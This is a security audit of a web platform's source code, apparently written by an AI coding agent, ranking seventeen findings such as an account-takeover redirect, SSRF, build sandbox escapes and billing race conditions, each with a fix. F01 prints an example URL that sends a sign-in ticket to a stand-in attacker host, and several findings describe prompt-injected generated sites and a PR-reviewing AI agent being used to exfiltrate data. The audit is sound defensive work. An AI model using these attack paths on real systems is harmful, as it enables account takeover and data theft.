**Flowstarter application security audit**

**Verdict: not ready for the first paying customer.** The principal blocker is an account takeover path: authentication transfer accepts tenant-controlled subdomains and sends them a Clerk sign-in ticket. Other launch blockers include anonymous SSRF, incomplete isolation of generated code, and bypassable spend controls.

Today’s changes materially improve security, but several protections stop short of the next boundary: the artifact timeout ends before body consumption; worker leases do not fence completion; Cal.com ordering does not distinguish old reschedules; and verified-email elevation was fixed in the API helper but not middleware.

This was a read-only source audit of checkout `50a2bab3b`. I ran small, in-memory checks of extracted rules, but did not execute hostile builds, contact deployed services, access databases, or run the RLS verifier, which creates fixtures. Dependencies were unavailable for full suites. Deployment-dependent findings are identified below.

The requested `apps/flowstarter-main/supabase/migrations` directory does not exist in this checkout. The migrations are under **`supabase/migrations`**. Both requested verification scripts were inspected.

**1. Ranked findings**

**F01 — Critical: authentication transfer sends sign-in tickets to tenant sites**

**Evidence:** [`isTrustedHost()`](packages/platform-config/src/index.ts:333) trusts a destination when its last two hostname segments equal the platform domain. [`isSafeRedirectUrl()`](packages/platform-config/src/index.ts:353) accepts both HTTP and HTTPS. The authenticated GET [`transfer-redirect`](apps/flowstarter-main/src/app/api/auth/transfer-redirect/route.ts:19) creates a Clerk sign-in token and appends it to the accepted destination at line 38. The POST [`transfer-token`](apps/flowstarter-main/src/app/api/auth/transfer-token/route.ts:32) uses the same rule.

Generated sites default to [`{slug}.{platformDomain}`](apps/deploy-agent/src/index.ts:217).

**Attack:** A malicious tenant directs a signed-in client or operator to:

```text
/api/auth/transfer-redirect?redirect_url=https://attacker.flowstarter.net/collect
```

The tenant’s page receives `__clerk_ticket` and can exfiltrate it for redemption during its validity period. An operator account exposes every workspace through the intentional team authorization bypass.

**Verification:** The actual platform rule returned `true` for both HTTPS and HTTP destinations at `attacker.flowstarter.net`.

**Fix:** Introduce a separate, pure **authentication-transfer destination policy** containing exact, operator-owned HTTPS origins and permitted callback paths. Never reuse the general redirect policy for credentials. Exclude tenant sites, previews, PR slots and production localhost destinations. Add tests covering every destination class and both transfer routes. Prefer a destination-bound, one-use exchange over forwarding a reusable authentication capability.

---

**F02 — High: anonymous brand/profile image fetching permits SSRF**

**Evidence:** [`isPublicHttpUrl()`](apps/flowstarter-main/src/lib/flowstarter/profile-signals.ts:90) checks the hostname text against a private-address regex; it does not resolve and constrain the destination IP. [`fetchImageBitmap()`](apps/flowstarter-main/src/lib/flowstarter/profile-image.ts:103) validates only the initial URL and then uses `redirect: 'follow'`. [`captureProfilePicture()`](apps/flowstarter-main/src/lib/flowstarter/profile-picture.ts:109) repeats that pattern.

The anonymous [`brand-signals` route](apps/flowstarter-main/src/app/api/discovery/brand-signals/route.ts:57) accepts a website URL and fetches its discovered images.

**Attack:** An attacker supplies a public page whose `og:image` points to an attacker-controlled HTTPS endpoint. That endpoint redirects to an internal HTTP service, loopback address or metadata endpoint. The server makes the request before image decoding rejects the response. DNS resolving a superficially public hostname to a private address is another bypass.

This proves a server-side request primitive; arbitrary response disclosure was not established.

**Fix:** Share one outbound-fetch adapter across profile, picture and image paths. Enforce scheme, port and public-address rules on every hop; bind the connection to a validated resolution; reject internal IPv4 and IPv6 destinations. Use bounded streaming and configured deadlines. Preserve the existing “no profile available” fallback. Test redirects, private DNS answers, rebinding and mixed address sets.

---

**F03 — High: generated code can execute during network-enabled installation**

**Evidence:** The full-build path denylist in [`assertMutableAgentPath()`](packages/agentic-codegen/src/flowstarter/pi-sdk.ts:1444) blocks `package.json` and lockfiles but permits `.pnpmfile.cjs`, `.npmrc` and `pnpm-workspace.yaml`.

The default install command uses [`--ignore-scripts`](apps/build-worker/src/config.ts:219), without disabling pnpm hooks. pnpm documents that disabling `.pnpmfile.cjs` is a separate control from disabling lifecycle scripts. [pnpm documentation](https://github.com/pnpm/pnpm.io/blob/main/versioned_docs/version-10.x/pnpmfile.md)

Furthermore, [`parseDockerValidation()`](apps/build-worker/src/config.ts:386) defaults installation to `bridge`; unless `PNPM_BAKED=true`, the **build also defaults to that network**, at line 400.

**Attack:** Hostile generated output writes a pnpm hook that executes during installation, phones home with the tenant’s source/assets or probes services reachable from the bridge. Even without a hook, generated Astro code has outbound access under the default non-baked configuration.

**Verification:** The extracted path rule accepted all three package-manager configuration files.

**Fix:** Make package-manager configuration and hooks immutable at the agent boundary. Disable pnpm hooks explicitly in the trusted invocation and use a trusted frozen dependency graph. Require the prepared validation image and `network=none` for generated execution in staging/production. Restrict installation to a registry proxy that cannot reach internal services. Test the resolved production configuration, not just individual Docker flags.

---

**F04 — High: output-directory symlinks cross the worker’s filesystem boundary**

**Evidence:** The validator checks `dist` with [`stat()`](apps/build-worker/src/validator.ts:344), which follows symlinks, then hands it to host-side scanners at [line 453](apps/build-worker/src/validator.ts:453).

[`resolveSiteOutputDir()`](apps/build-worker/src/site-output.ts:73) likewise accepts a symlinked output root. [`collectSiteFiles()`](apps/build-worker/src/site-output.ts:101) skips symlink *entries*, but calls `readdir()` on that root. [`collectBuiltSiteText()`](packages/agentic-codegen/src/flowstarter/workflows.ts:2002) has the same root issue.

**Attack:** Generated build-time code replaces `/site/dist` with an absolute symlink to a host-readable directory. The target need not exist inside the container. After container exit, the privileged worker follows it on the host, potentially reading neighboring client output or configuration. The local publishing path can package such reads; successful publication remains subject to later content gates.

**Fix:** Validate the output root with `lstat()` and canonical containment before any scanner or packager opens it. Apply the same policy to every output reader. Transfer output through an isolated, bounded export step into a fresh host-owned directory. Test root symlinks, intermediate symlinks, special files and post-build path replacement.

---

**F05 — High: output gates do not enforce safe browser behavior**

**Evidence:** Full agents may modify [`src/pages/*.astro` and other executable source](packages/agentic-codegen/src/flowstarter/pi-sdk.ts:1444). The validator’s output checks cover [binary assets, preview teasers, calendar residue and placeholders](apps/build-worker/src/validator.ts:460), rather than browser capabilities.

The trusted [`site-runtime.Caddyfile`](apps/deploy-agent/docker/site-runtime.Caddyfile:10) serves JavaScript and SVG without a Content Security Policy. The dashboard preview policy is only [`sandbox allow-scripts; frame-ancestors 'self'`](apps/flowstarter-main/src/lib/flowstarter/site-preview.ts:348).

**Attack:** Prompt injection produces a visually correct site that:

- Sends contact-form contents to an external endpoint.
- Loads an external script or tracking pixel.
- Redirects visitors to a phishing page.
- Registers a service worker.
- Exfiltrates preview content using browser network requests.

Placeholder and visual checks can all pass. The dashboard sandbox protects its origin, but does not itself prohibit outbound requests.

**Fix:** Define a deterministic site capability policy. Keep integration code, approved script entrypoints, form destinations and external origins in trusted templates. Validate source and compiled output against that policy, and generate an enforcing CSP from the approved capabilities. Use adversarial tests for alternate form actions, dynamic imports, event handlers, SVG, redirects and external loads. Do not ask an LLM to decide whether its own output is safe.

---

**F06 — High: public model spend is not reliably capped**

**Evidence:** [`funnelBudgetState()`](apps/flowstarter-main/src/lib/ai/funnel-cost.ts:227) fetches individual `cost_eur` rows without pagination or server-side aggregation. [`supabase/config.toml`](supabase/config.toml:18) sets `max_rows = 1000`. Consequently, larger monthly ledgers are summed incompletely.

The calculation also does not reserve spend before concurrent requests. Failed writes merely increment a counter and log at [line 174](apps/flowstarter-main/src/lib/ai/funnel-cost.ts:174).

The public [`support-chat` model call](apps/flowstarter-main/src/app/api/support-chat/route.ts:109) supplies no workspace. The common wrapper’s [`workspaceCapExceeded()`](apps/flowstarter-main/src/lib/ai/llm.ts:336) allows calls without a workspace; its cap is off by default.

**Attack:** An anonymous caller repeatedly invokes paid model paths, or starts concurrent previews while the recorded total remains below the cap. Once the ledger exceeds the API row limit, the check may continue reporting an incomplete total. Per-call token limits bound individual requests, not aggregate spend.

**Fix:** Use database-side totals and an atomic reservation/reconciliation ledger. Apply a global anonymous-work budget to every public paid-model path, with configured per-action limits and concurrency limits. Preserve deterministic fallback when generation is unavailable. Test more than the API row limit, concurrent reservations, failed accounting writes and missing workspace IDs.

---

**F07 — High: public request and image size checks happen after buffering**

**Evidence:** The anonymous picture route trusts optional `Content-Length`, then calls [`request.formData()`](apps/flowstarter-main/src/app/api/discovery/brand-signals/picture/route.ts:91) before checking the file’s actual size.

Remote images are buffered with [`response.arrayBuffer()`](apps/flowstarter-main/src/lib/flowstarter/profile-image.ts:120), and profile pictures repeat this at [line 127](apps/flowstarter-main/src/lib/flowstarter/profile-picture.ts:127). Size rejection follows allocation.

**Attack:** Send an oversized chunked multipart request without `Content-Length`, or serve a large image response without that header. The application allocates beyond the advertised limit before refusing it. Concurrent requests amplify availability impact.

**Fix:** Enforce configured request-body limits at ingress and through streaming readers. Abort immediately when cumulative bytes exceed the limit. Bound decoded image pixels and processing concurrency as well. Test missing length, chunked bodies, oversized non-file fields and compressed image expansion.

---

**F08 — High, deployment-dependent: PR code runs with shared host access and staging credentials**

**Evidence:** The PR workflow checks out [`pull_request.head.sha`](.depot/workflows/staging-pr-deploy.yml:107), builds its Dockerfile and deploys it. Slot containers use [`network_mode: host` and the staging env file](deploy/hetzner-staging/docker-compose.yml:33). The application runtime stage has [no `USER` instruction](deploy/hetzner-staging/Dockerfile:110).

Production deployment uses the same named [`STAGING_SSH_*` credentials](.depot/workflows/release.yml:390).

**Attack:** A malicious PR that is eligible for deployment, or compromised code in such a PR, reads injected staging credentials and reaches host-local Supabase and deployment services. The shared production host increases the consequence of a staging compromise.

I did not verify Depot’s fork-secret policy or actual installed credentials; this does not assume every external fork receives secrets.

**Fix:** Isolate PR workloads from the production host and deployment credentials. Give each preview an isolated database/environment, run non-root with resource limits, and use explicit network access rules. Separate staging and production SSH identities and permissions. Test that a PR container cannot reach host administration or another slot’s database.

---

**F09 — Medium, configuration-dependent: local preview execution remains available outside development**

**Evidence:** The frame route’s [`isLocalPreviewFrameAllowed()`](apps/flowstarter-main/src/lib/discovery/local-preview-guard.ts:25) requires development. However, the publisher fallback checks only [`FLOWSTARTER_LOCAL_PREVIEW === 'true'`](apps/flowstarter-main/src/app/api/discovery/preview/live/route.ts:775).

[`publishLocalPreview()`](apps/flowstarter-main/src/app/api/discovery/preview/live/route.ts:399) runs generated Astro source on the application host with `env: process.env`.

**Attack:** If that development flag survives into staging/production and the sandbox fails, hostile generated source executes with application credentials. Blocking the frame response does not prevent this execution.

**Fix:** Apply the environment rule before spawning, and refuse this configuration at startup outside development. Scrub the environment even in development. Add a regression test proving sandbox failure cannot trigger native execution in staging/production.

---

**F10 — Medium: bounded artifact fetch still permits indefinite bodies and decompression exhaustion**

**Evidence:** [`fetchAndVerify()`](apps/deploy-agent/src/index.ts:550) clears its timeout at line 572, before `readBounded()` consumes the body at line 578.

[`safeExtractTarball()`](apps/deploy-agent/src/tar-safety.ts:240) calls `gunzipSync(gz)` before checking entry count and total extracted size.

**Attack:** A compromised artifact origin sends headers promptly, then dribbles a body indefinitely, holding the deployment and slug lock. An authenticated hostile archive can also expand substantially before the extraction limit is evaluated. Hash verification authenticates the expected bytes; it does not make them inexpensive to process.

**Fix:** Keep the deadline active through body consumption. Bound decompression output during expansion and bound parsing work, including metadata. Add configured global deployment concurrency and queue limits. Test slow bodies and small compressed archives exceeding the expansion limit. Node supports a `maxOutputLength` option for convenience decompression methods. [Node documentation](https://nodejs.org/api/zlib.html)

---

**F11 — Medium: Cal.com replay/order protection is incomplete**

**Evidence:** [`bookingWriteAction()`](apps/flowstarter-main/src/lib/flowstarter/cal-webhook.ts:267) treats a different rescheduled time as an update without an event-order marker.

[`recordCalBooking()`](apps/flowstarter-main/src/lib/flowstarter/bookings-data.ts:162) reads then updates without comparing the state it read. At line 224, any concurrent unique-insert conflict becomes a replay, even if the competing delivery represents a different transition.

**Attack:** Replay an older valid reschedule after a newer one to restore stale booking times. Concurrent cancellation/reschedule deliveries can also overwrite cancellation or lose the cancellation on the insert race. A tenant knows its own webhook secret by design, so this is not cross-tenant forgery.

**Verification:** The pure rule returned `{ kind: 'update' }` for an old reschedule following a newer one.

**Fix:** Track provider event ordering where available, otherwise reconcile ambiguous events against the provider. Make transition and ordering checks atomic with the write. On insert conflict, reread and evaluate the incoming transition. Test reversed reschedules and concurrent create/cancel/reschedule deliveries.

---

**F12 — Medium: Stripe ordering and state transitions are not atomic**

**Evidence:** [`resolveOrdered()`](apps/flowstarter-main/src/app/api/webhooks/stripe/route.ts:182) checks previously processed events. Subscription handling then [reads workspace state](apps/flowstarter-main/src/app/api/webhooks/stripe/route.ts:395), evaluates pure transition rules, and writes through [`updateWorkspace()`](apps/flowstarter-main/src/app/api/webhooks/stripe/route.ts:105), which filters only by workspace ID.

The event ledger explicitly [allows simultaneous processing](apps/flowstarter-main/src/lib/billing/stripe-events.ts:96).

**Attack:** Two valid events execute concurrently, both pass checks against old state, and the older event writes last. For example, an active update can race cancellation and restore stale subscription state. Both can be acknowledged as processed.

The new error handling and durable event ledger are valuable; they do not serialize different events for one billing object.

**Fix:** Atomically apply state transitions with an object/workspace version or ordering marker. Keep the rules pure, but enforce their preconditions in the database mutation. Use a durable outbox for external side effects. Test simultaneous deliveries with deliberately reversed write completion.

---

**F13 — Medium: expired worker leases do not fence publishing or completion**

**Evidence:** On lease loss, [`index.ts`](apps/build-worker/src/index.ts:193) only logs that completion will be refused. Yet [`markHumanQa()`](apps/build-worker/src/job-store.ts:1260) updates the job using only its ID, clears the lease and marks success.

The workflow [publishes before calling `markHumanQa()`](packages/agentic-codegen/src/flowstarter/workflows.ts:2576).

**Attack:** A slow worker loses its lease and another worker reclaims the job. The original worker continues, publishes stale output and overwrites the current job’s completion state. Expensive hostile generation or interrupted heartbeats can increase the likelihood.

**Fix:** Give each claim a monotonically increasing fencing token. Require it for mutations and publication authorization, and cancel work when ownership is lost. Test that the old attempt cannot publish, finish or fail a reclaimed job.

---

**F14 — Medium: anonymous uploads can accumulate without a reaping parent**

**Evidence:** [`funnel_assets.preview_id`](supabase/migrations/20260912090000_funnel_assets_and_workspace_brief.sql:37) intentionally has no foreign key because uploads precede preview creation.

[`storeFunnelAsset()`](apps/flowstarter-main/src/lib/flowstarter/funnel-assets.ts:202) limits rows per supplied preview ID using a non-atomic read/count. The reaper begins with [`listExpiredFunnelPreviews()`](apps/flowstarter-main/src/lib/hosting/preview-reaper.ts:83), then deletes assets for those candidates.

**Attack:** Upload under fresh UUIDs and never generate a preview. Those assets have no preview row to enter the reaper’s candidate list. Concurrent uploads can also exceed the per-preview count check.

**Fix:** Create an expiring server-issued upload session before accepting assets, reserve its quota atomically, and independently reap stale unclaimed asset rows and orphaned storage objects. Keep numeric limits in shared configuration. Test upload-only abandonment and concurrent uploads.

---

**F15 — Medium: backups leave database secrets unencrypted and can retain plaintext env archives**

**Evidence:** [`backup.sh`](deploy/hetzner-staging/scripts/backup.sh:381) stores database dumps directly. Only `/etc/flowstarter` is encrypted. Those databases include per-workspace webhook secrets and other sensitive records.

The script [creates the plaintext env archive before encryption](deploy/hetzner-staging/scripts/backup.sh:397), and removes it only after successful encryption. There is no restrictive `umask` in the script or `UMask` in its [systemd unit](deploy/hetzner-staging/systemd/flowstarter-backup.service:9).

**Attack:** A backup-storage reader obtains database PII and secrets. If encryption fails, the plaintext env archive remains; with permissive host defaults it may also be readable by other local users.

**Fix:** Set restrictive directory/file permissions and umask, encrypt database dumps too, and stream archives directly into encryption. Install failure cleanup for unavoidable temporary plaintext. Test encryption failure, permissions and restoration from encrypted artifacts.

---

**F16 — Medium: production artifacts lack enforced provenance**

**Evidence:** Release builds publish and deploy [`tagged GHCR references`](.depot/workflows/release.yml:366), without a deploy-time digest/signature verification step. The application [base image is tag-selected](deploy/hetzner-staging/Dockerfile:12).

Cloud-init [downloads and executes the deploy-agent binary](apps/flowstarter-main/src/lib/hosting/cloud-init.ts:352) without verifying an expected digest or signature.

**Attack:** A compromised package-publishing credential or binary origin replaces an artifact without changing the application source revision an operator believes is being deployed.

**Fix:** Deploy immutable image digests tied to the reviewed commit, verify signed provenance, and pin application base-image digests. Require an authenticated manifest for the deploy-agent binary. Separate package-writing credentials from production pull credentials. Test rejection of a mismatched digest and wrong provenance subject.

---

**F17 — Low: middleware retains unverified-email admin elevation**

**Evidence:** Middleware’s [`emailDomainRole()`](apps/flowstarter-main/src/middleware.ts:84) checks only the email domain. [`resolveRoleEdge()`](apps/flowstarter-main/src/middleware.ts:127) discards the verification state before calling it.

The API helper correctly [requires `verification.status === 'verified'`](apps/flowstarter-main/src/lib/api-auth.ts:217).

**Attack:** Where Clerk permits an active session with an unverified primary team-domain address, middleware admits the user to the admin shell. Inspected API helpers still deny elevation, so this finding does **not** establish admin data access by itself.

**Fix:** Extract one shared pure role-fallback rule and call it from middleware and API authorization. Test unverified, missing-verification and verified addresses identically.

**2. Tenant isolation assessment**

| Boundary | Assessment |
|---|---|
| Database identity | The RLS helpers derive identity from JWT `sub`, not editable user metadata. `is_workspace_member()` checks both workspace and caller identity. See [identity helpers](supabase/migrations/20260829090100_concierge_rls_policies.sql:17). |
| Membership and workspaces | Member reads are policy-scoped; the later hardening migration explicitly removes browser write grants. See [grant hardening](supabase/migrations/20260909143500_tenant_isolation_hardening.sql:109). |
| Tenant records | Assets, messages, bookings and briefs use membership policies; sensitive columns receive narrower grants. I did not establish a direct cross-tenant SQL read through the inspected policies. |
| Storage | `tenant-assets` is private, reads require membership in the UUID extracted from `tenant/{workspaceId}/…`, and browser writes have no permitting policy. See [storage migration](supabase/migrations/20260830140000_tenant_assets_storage_bucket.sql:35). Anonymous funnel storage has the separate lifecycle weakness in F14. |
| Application authorization | [`requireWorkspaceAccess()`](apps/flowstarter-main/src/lib/api-auth.ts:340) permits operators intentionally, otherwise checks workspace and user membership together. This makes F01 especially serious for operator sessions. |
| Portrait/brief assets | The worker reloads assets with [`withTenant()` and current rights confirmation](apps/build-worker/src/change-request-assets.ts:129). This is stronger than trusting asset IDs or rights claims copied into an old job payload. |
| Public lead tokens | Random, rotatable workspace tokens grant creation only. The route resolves the workspace server-side, checks its origins and returns no lead ID. See [capture route](apps/flowstarter-main/src/app/api/leads/capture/[token]/route.ts:75). Tokens and Origin checks do not authenticate a human sender. |
| Cal.com secrets | Secrets are per workspace and signatures precede booking writes. A leaked secret affects that workspace’s bookings, not another workspace. Ordering remains defective under F11. |
| Worker | Service-role access requires explicit scoping. The static guard has documented queue/claim exceptions, and asset reads are scoped. Filesystem handoff and lease fencing remain weak: F04/F13. |
| Deploy agent | Authentication is host-wide, not per tenant. Any holder of the shared secret can deploy/remove any accepted slug. This is a privileged control plane, not an independently enforced tenant authorization boundary. |
| Site containers | Trusted Dockerfile, digest-pinned Caddy, non-root UID, read-only root, dropped capabilities, no-new-privileges, memory/PID limits and loopback published ports are strong controls. See [runtime flags](apps/deploy-agent/src/docker-runtime.ts:433). Default bridge networking still provides egress; filesystem runtime remains selectable. |

The RLS verifier performs useful positive and negative checks, including cross-tenant writes and storage reads. The [table guard](apps/flowstarter-main/scripts/tenant-table-guard.mjs:132) shares its inventory and currently has an empty allowlist.

However, this proves **the tables and operations represented by its fixtures**, not every security boundary. The catalog inventory recognizes only [`workspace_id`, `project_id`, `claimed_workspace_id`](supabase/migrations/20260909143500_tenant_isolation_hardening.sql:248). It does not automatically cover views, new tenant-key names, all functions, browser-origin trust or worker filesystem reads. I inspected these checks but did not execute their database mutations.

**3. Secrets and supply chain**

Positive controls include service-role separation, allowlisted worker child environments, timing-safe deploy-agent authentication, private asset storage and deliberate redaction of artifact URLs. The local publisher [logs artifact size/hash instead of its capability URL](apps/build-worker/src/local-publisher.ts:92).

Material remaining risks are:

- **Credential-bearing URLs:** F01 deliberately places an authentication ticket on an untrusted destination. Those query parameters can also enter destination access logs.
- **Inherited credentials:** F09 passes the entire application environment into native generated-code execution.
- **Backups:** F15 exposes database secrets and has incomplete plaintext cleanup.
- **Build provenance:** F16; a git SHA in a tag or health response is not verification of the image’s contents.
- **CI privileges:** PR deployment declares package and pull-request write permissions and uses a GHCR PAT. Production reuses the staging SSH credential names. Actual PAT scopes were not observable.
- **Reviewer prompt injection:** OpenCode reads PR-controlled files with [persisted checkout credentials](.depot/workflows/opencode-review.yml:265) and receives [provider/GitHub credentials](.depot/workflows/opencode-review.yml:355). Its pinned action is positive, but tool restrictions should independently prevent repository text from causing credential reads or arbitrary execution. I did not establish an exploit in that external action.
- **Pins:** pnpm and the site runtime are explicitly pinned; application Docker bases and many CI actions use movable tags. No dependency CVE verdict is claimed without a resolved dependency audit.

The repository also contradicts the supplied “hosted Supabase is never referenced” convention: [release configuration](.depot/workflows/release.yml:375) intentionally targets hosted production Supabase. That is a documentation/policy inconsistency, not proof of exposure. No hosted database was contacted.

Stripe constructors accept configured keys without an explicit test-mode assertion in the inspected billing/webhook paths. Treat test-mode-only operation as configuration-dependent until it is enforced centrally.

**4. Prompt injection and generated-code risks**

The Pi integration has meaningful safeguards: bounded file tools, canonical containment, immutable sensitive filenames, and [disabled extensions/skills](packages/agentic-codegen/src/flowstarter/pi-sdk.ts:1080). Deterministic pricing, routing and content gates should remain authoritative.

These safeguards do not make generated code trustworthy:

- Astro/MDX/data modules can execute during compilation.
- Package-manager configuration is an execution surface, even without a shell tool.
- A successful build does not establish safe scripts, redirects, external loads or form destinations.
- Sandboxing the dashboard preview prevents direct access to dashboard cookies/storage, but does not prevent external requests or deceptive content.
- Human visual review is unlikely to detect conditional JavaScript or duplicate form submission.

The source-side correction is a trusted template capability model plus independent execution/network restrictions and compiled-output validation. None of the recommended fixes require patching a built customer site.

**5. Abuse and cost controls**

Existing controls include per-token and per-IP lead limits, honeypots, body schemas, preview token rejection, per-call model budgets, a monthly funnel fallback and bounded worker queues.

Important limits remain:

- The [shared lead limiter](apps/flowstarter-main/src/lib/rate-limit.ts:214) deliberately allows requests when Redis fails. Preserve that availability convention; add monitoring and independent abuse controls rather than silently changing it.
- Several discovery limiters are process-local. Restarting or scaling multiplies allowances.
- IP extraction trusts the first `X-Forwarded-For` entry. Its integrity depends on ingress overwriting untrusted forwarding headers and preventing direct application-port access.
- Arcjet protection is [conditional on configuration](apps/flowstarter-main/src/middleware.ts:456).
- The public lead token is visible in site HTML. A bot can copy it and spoof Origin outside a browser, consuming the token quota and creating spam/email load.
- F06, F07 and F14 allow monetary, memory and storage abuse beyond the apparent per-request limits.
- Worker memory/PID limits do not bound writable bind-mount disk consumption. Generated builds need configured disk and CPU budgets as well.

**6. Prioritized fix list**

Estimates are engineering days for one engineer familiar with the repository, including meaningful regression tests.

| Priority | Work | Estimate |
|---|---|---:|
| P0 | F01: exact authentication-transfer destination policy | 1–2 days |
| P0 | F02: shared SSRF-safe outbound fetch adapter | 2–3 days |
| P0 | F03/F09: immutable package-manager config, prepared isolated runtime, no native production fallback | 2–3 days |
| P0 | F04: canonical output export and reader containment | 1–2 days |
| P0 | F05: trusted browser capabilities and enforcing CSP | 3–5 days |
| P0 | F06: complete aggregation, reservations and public-model budget coverage | 2–4 days |
| P0 | F07: streaming ingress/download limits | 1–2 days |
| P0 | F08: isolate PR workloads and credentials from production | 2–4 days |
| P1 | F10: full-body deadlines and bounded decompression | 1–2 days |
| P1 | F11/F12: atomic webhook transitions and ordering tests | 3–5 days |
| P1 | F13: lease fencing through publication | 2–3 days |
| P1 | F14: upload sessions, atomic quotas and orphan cleanup | 1–2 days |
| P1 | F15: encrypted backups and failure-safe cleanup | 1–2 days |
| P1 | F16: digest deployment and provenance verification | 2–3 days |
| P1 | F17: shared verified-email role rule | ½ day |

Before accepting a paying customer, close the P0 items and demonstrate the P1 money-state, lease and backup fixes in an isolated environment. Re-run the existing local RLS/storage proof unchanged, then add adversarial checks for the boundaries it does not cover.
---

Produced 2026-09-13 by OpenAI Codex CLI 0.154.0 with gpt-6-astra in a read-only sandbox against main at 50a2bab3b, on request from Darius. Companion to audit-2026-09-13-claude.md. Findings are tracked as follow-up PRs.
